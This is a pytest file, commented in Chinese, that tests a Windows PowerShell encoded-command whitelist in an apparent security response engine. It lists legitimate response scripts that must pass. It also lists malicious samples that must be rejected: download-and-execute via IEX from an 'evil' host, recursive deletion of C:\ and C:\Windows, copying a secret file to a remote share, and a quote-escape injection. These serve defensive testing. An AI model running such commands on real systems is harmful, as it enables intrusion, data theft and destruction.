# -*- coding: utf-8 -*-
"""R13: WIN-004 编码命令必须过解码模板指纹 (P1-1)。

修复前: 外形正则 `[A-Za-z0-9+/=]+$` 对 Base64 内容零约束 — 任意 PowerShell
脚本编码后都能过白名单, Windows 侧唯一防线退化为调用点输入消毒。

锁定:
  1) 已登记的 8 个响应动作脚本形状(参数取真实边界值) → 放行;
  2) 恶意/模板外脚本(下载执行/删除/模板拼接) → 拒绝且 reason 含 decoded_mismatch;
  3) 随机 payload 属性测试(1000 轮): 模板外必拒(fail-closed);
  4) 动作↔模板守卫: host_adapter 的每个输出标记都有对应模板(防未来漏登记)。
"""
from __future__ import annotations

import base64
import os
import random
import sys

import pytest

os.environ.setdefault("SHARED_MEMORY_SKIP_DOTENV", "1")
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from response_engine.command_whitelist import command_whitelist  # noqa: E402
from response_engine.ps_templates import (  # noqa: E402
    WINDOWS_PS_TEMPLATES,
    decode_encoded_command,
)

HEX64 = "a3f1d0c2b4e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2"


def _enc(script: str) -> str:
    return (
        "powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand "
        + base64.b64encode(script.encode("utf-16-le")).decode()
    )


def _check(script: str):
    return command_whitelist.check(_enc(script), platform="windows")


# ── 与 host_adapter 生成形状逐字一致的合法脚本(已知答案) ──

LEGIT_SCRIPTS = [
    # kill by pid
    "$p = Get-Process -Id 4242 -ErrorAction SilentlyContinue\n"
    "if ($null -eq $p) { Write-Output 'NOT_FOUND'; exit 2 }\n"
    "Stop-Process -Id 4242 -Force\n"
    "Write-Output 'KILLED 4242'",
    # kill by hash
    f"$t = '{HEX64}'\n"
    "$n = 0; $max = 20\n"
    "Get-CimInstance Win32_Process | ForEach-Object {\n"
    "  if ($n -ge $max) { return }\n"
    "  $path = $_.ExecutablePath\n"
    "  if (-not $path) { return }\n"
    "  try { $h = (Get-FileHash -LiteralPath $path -Algorithm SHA256).Hash.ToLower() } catch { return }\n"
    "  if ($h -eq $t) { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue; $n++ }\n"
    "}\n"
    'Write-Output "KILLED_COUNT $n"',
    # quarantine
    "$src = 'C:\\\\Users\\\\victim\\\\evil.exe'\n"
    "$dst = 'C:\\\\quarantine\\\\evil.exe'\n"
    "New-Item -ItemType Directory -Force -Path (Split-Path $dst) | Out-Null\n"
    "Move-Item -LiteralPath $src -Destination $dst -Force\n"
    'Write-Output "QUARANTINED $dst"',
    # restore
    "Move-Item -LiteralPath 'C:\\\\quarantine\\\\evil.exe' "
    "-Destination 'C:\\\\Users\\\\victim\\\\evil.exe' -Force\n"
    "Write-Output 'RESTORED'",
    # persistence run
    "$k = 'HKLM:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run'\n"
    "$n = 'evil_autorun'\n"
    "Remove-ItemProperty -Path $k -Name $n -ErrorAction SilentlyContinue\n"
    "Write-Output 'REMOVED'",
    # persistence service
    "Stop-Service -Name 'evilsvc' -Force -ErrorAction SilentlyContinue\n"
    "Set-Service -Name 'evilsvc' -StartupType Disabled -ErrorAction SilentlyContinue\n"
    "Write-Output 'SERVICE_DISABLED'",
    # persistence lnk
    "$p = 'C:\\\\Users\\\\victim\\\\AppData\\\\evil.lnk'\n"
    "if (Test-Path -LiteralPath $p) { Copy-Item $p \"$p.bak.soc\"; Remove-Item -LiteralPath $p -Force }\n"
    "Write-Output 'LNK_REMOVED'",
    # forensic snapshot
    "Get-Process | Select-Object -First 80 Id,ProcessName,Path | ConvertTo-Json -Compress\n"
    "Write-Output '---NET---'\n"
    "Get-NetTCPConnection -ErrorAction SilentlyContinue | "
    "Select-Object -First 80 LocalAddress,LocalPort,RemoteAddress,RemotePort,OwningProcess,State | "
    "ConvertTo-Json -Compress",
    # ── response_registry 形状(逐字对齐 _init_registry 各生成器) ──
    # rate_limit
    '$name = "RE_RateLimit_1_2_3_4"\n'
    '$ip = "1.2.3.4"\n'
    "$rate = 102400\n"
    "New-NetQosPolicy -Name $name -IPSourceAddress $ip "
    "-IPProtocol TCP -ThrottleRateInBits $rate "
    '-Description "ResponseEngine rate-limit: flood" '
    "-ErrorAction Stop\n"
    'Write-Output "QoS policy $name created"',
    # remove_rate_limit
    '$name = "RE_RateLimit_1_2_3_4"\n'
    "Remove-NetQosPolicy -Name $name -Confirm:$false -ErrorAction SilentlyContinue\n"
    'Write-Output "QoS policy $name removed"',
    # kill_session (logoff)
    "logoff 3 /server:localhost 2>$null\n"
    'Write-Output "Session 3 logged off"',
    # kill_session (by user)
    "Get-Process -IncludeUserName | "
    'Where-Object {$_.UserName -eq "CORP\\\\evil"} | '
    "Stop-Process -Force\n"
    'Write-Output "Processes for CORP\\\\evil terminated"',
    # kill_session (by name)
    'Stop-Process -Name "evil" -Force -ErrorAction SilentlyContinue\n'
    'taskkill /F /IM "evil" /T 2>$null\n'
    'Write-Output "Process evil terminated"',
    # send_eventlog
    'Write-EventLog -LogName Application -Source "ResponseEngine" '
    "-EntryType ERROR -EventId 1000 "
    '-Message "block: 1.2.3.4: c2" '
    "-ErrorAction SilentlyContinue",
    # display notification
    '[System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") | Out-Null\n'
    "$n = New-Object System.Windows.Forms.NotifyIcon\n"
    "$n.Icon = [System.Drawing.SystemIcons]::Warning\n"
    '$n.BalloonTipTitle = "alert"\n'
    '$n.BalloonTipText = "msg"\n'
    "$n.Visible = $true\n"
    "$n.ShowBalloonTip(10000)",
    # post_validator qos verify
    "Get-NetQosPolicy -Name 'RE_RateLimit_1_2_3_4' -ErrorAction SilentlyContinue",
]


@pytest.mark.parametrize("script", LEGIT_SCRIPTS)
def test_legit_action_scripts_pass(script):
    allowed, rule_id, reason = _check(script)
    assert allowed, f"合法响应动作脚本被拒: rule={rule_id} reason={reason}"


MALICIOUS_SCRIPTS = [
    "IEX (New-Object Net.WebClient).DownloadString('http://evil/x.ps1')",
    "Remove-Item C:\\ -Recurse -Force",
    "$c = 'calc.exe'; Start-Process $c",
    "Get-Content C:\\\\Users\\\\admin\\\\secret.txt | Out-File \\\\\\\\evil\\\\share",
    "Set-ExecutionPolicy Bypass; Invoke-Expression $(curl http://evil)",
    # 模板形状 + 注入尾巴(最隐蔽: 合法形状后拼一行)
    LEGIT_SCRIPTS[2] + "\nRemove-Item C:\\\\Windows -Recurse",
    # 模板形状但参数换码(把 {q} 段换成含引号逃逸)
    "$src = 'x' ; Start-Process calc'\n$dst = 'y'\nMove-Item -LiteralPath $src -Destination $dst -Force",
]


@pytest.mark.parametrize("script", MALICIOUS_SCRIPTS)
def test_malicious_scripts_rejected(script):
    allowed, rule_id, reason = _check(script)
    assert not allowed, f"恶意脚本被放行! rule={rule_id}"
    assert "decoded" in rule_id.lower() or "decoded_mismatch" in reason, \
        f"拒绝原因必须是解码层: {rule_id}/{reason}"


def test_invalid_base64_rejected():
    # "abcde" 满足外形正则([A-Za-z0-9+/=]+)但 b64 长度非法 → 必须在解码层被拒
    allowed, rule_id, reason = command_whitelist.check(
        "powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand abcde",
        platform="windows",
    )
    assert not allowed and "decode" in reason.lower()


def test_random_payloads_fail_closed():
    """1000 轮随机 payload: 不命中模板必拒。"""
    rng = random.Random(1337)
    alphabet = "abcdefghij =$(){}'\"|;\n-"
    rejected = 0
    for _ in range(1000):
        s = "".join(rng.choice(alphabet) for _ in range(rng.randint(1, 120)))
        allowed, _, _ = _check(s)
        if allowed:
            # 允许的唯一路径是逐字命中模板 — 随机命中概率为 0, 出现即 bug
            ok, _, decoded = decode_encoded_command(
                _enc(s).rsplit(" ", 1)[-1])
            assert ok and any(t.matches(decoded) for t in WINDOWS_PS_TEMPLATES), \
                f"随机脚本被放行且不命中模板: {s!r}"
        else:
            rejected += 1
    assert rejected >= 990, "随机脚本绝大多数应被拒绝"


def test_action_markers_have_templates():
    """守卫: host_adapter 每个 PowerShell 动作输出标记 ↔ 模板 marker 对齐。

    防未来新增 powershell=True 动作却忘了登记模板 — 模板缺失时该动作在
    live 下会被 WIN-004-DECODED 拒绝(能力静默消失), 这里第一时间红。
    """
    import inspect
    import response_engine.containment.host_adapter as ha
    src = inspect.getsource(ha)
    markers = ["KILLED", "KILLED_COUNT", "QUARANTINED", "RESTORED",
               "REMOVED", "SERVICE_DISABLED", "LNK_REMOVED", "---NET---"]
    tpl_markers = {t.marker for t in WINDOWS_PS_TEMPLATES}
    for m in markers:
        if m in src:
            assert m in tpl_markers, f"host_adapter 输出标记 {m!r} 无对应解码模板"
